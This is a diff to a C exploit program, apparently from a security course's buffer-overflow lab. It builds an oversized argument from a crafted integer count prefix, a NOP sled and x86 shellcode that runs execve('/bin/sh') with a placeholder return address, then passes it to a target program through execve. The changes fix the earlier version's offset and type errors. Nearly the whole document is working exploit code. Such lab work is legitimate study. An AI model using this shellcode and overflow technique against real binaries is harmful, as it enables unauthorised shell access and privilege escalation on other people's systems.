@@ -33,27 +33,29 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  char buf[3000] = "4294967246, "; 
-  int i = 0;
-	for  (i; i <12; i++) {
-		printf("%c", buf[i]);
-	}
-  for (i; i < (56*48) + 48; i++){    //leave room in buffer for shell code. After for-loop buf[2748] is next empty mem addr; 60 bytes to overflow 
-  	int x = 30+i;
-  	buf[x] = "\x90";
-  }
- 	buf[2748] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"  //the 60 bytes that cause overflow
+  char buf[2816] = "2362232048,";  //unsigned int to read 2816 bytes, takes 11 bytes, next empty mem addr is buf[11]
+  char sh[] = 
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
 "\x80\xe8\xdc\xff\xff\xff/bin/sh"
 "\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-"\x90\x90\x90\x90\xaa\xff\xff\xbf";
+"\x90\x90\x90\x90\x77\x77\x77\x77";
+
+  int i = 0;
+  for (i; i < 2746; i++){    //leave room in buffer for shell code. After for-loop buf[2756] is next empty mem addr; 60 bytes til overflow 
+  	int x = 11+i;
+  	buf[x] = '\x90';
+  }
+	
+ 	memcpy(&(buf[2756]), sh, sizeof(sh));  //copy shell code into buf, starting at buf[2756].
+
 
   args[0] = TARGET;
   args[1] = buf;
   args[2] = NULL;
   env[0] = NULL;
-  printf("%d\n",sizeof(struct widget_t));
+  printf("%s\r\n",buf);
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
